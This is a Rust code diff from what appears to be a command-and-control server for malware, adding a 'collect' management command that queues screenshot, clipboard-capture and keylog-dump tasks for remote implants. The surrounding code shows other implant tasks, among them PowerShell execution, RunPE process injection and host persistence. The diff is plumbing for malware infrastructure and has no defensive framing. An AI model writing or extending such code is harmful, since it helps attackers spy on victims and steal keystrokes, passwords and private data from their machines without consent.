@@ -2,8 +2,8 @@ use abraham_common::crypto::{self, ClientHello, Session};
 use abraham_common::frame::{open_frames, ProtocolError};
 use abraham_common::http::{read_request, write_response, HttpRequest, HDR_HANDSHAKE, HDR_SESSION};
 use abraham_common::message::{
-    self, driver_action, msg, persist_action, Chunk, Message, RegisterInfo, Task, TaskBody,
-    TaskResult,
+    self, collect_action, driver_action, msg, persist_action, Chunk, Message, RegisterInfo, Task,
+    TaskBody, TaskResult,
 };
 use abraham_common::profile::{Profile, DEFAULT_PROFILE_PATH};
 use ed25519_dalek::SigningKey;
@@ -1160,6 +1160,23 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
             )
             .await
         }
+        "collect" => {
+            // ABR-T031: screenshot / clipboard / keylog dump.
+            let action = match request.get("action").and_then(|v| v.as_str()) {
+                Some("screenshot") => collect_action::SCREENSHOT,
+                Some("clipboard") => collect_action::CLIPBOARD,
+                Some("keylog") => collect_action::KEYLOG_DUMP,
+                _ => {
+                    return json!({ "error": "collect action must be screenshot, clipboard or keylog" });
+                }
+            };
+            let arg = request
+                .get("arg")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            queue_task(state, &request, TaskBody::Collect { action, arg }).await
+        }
         "persist" => {
             // ABR-T030: host persistence install/remove/list.
             let action = match request.get("action").and_then(|v| v.as_str()) {
@@ -1461,6 +1478,7 @@ fn task_kind_name(body: &TaskBody) -> &'static str {
         TaskBody::PowerShell { .. } => "psrun",
         TaskBody::RunPe { .. } => "runpe",
         TaskBody::Persist { .. } => "persist",
+        TaskBody::Collect { .. } => "collect",
         TaskBody::Exit => "exit",
     }
 }
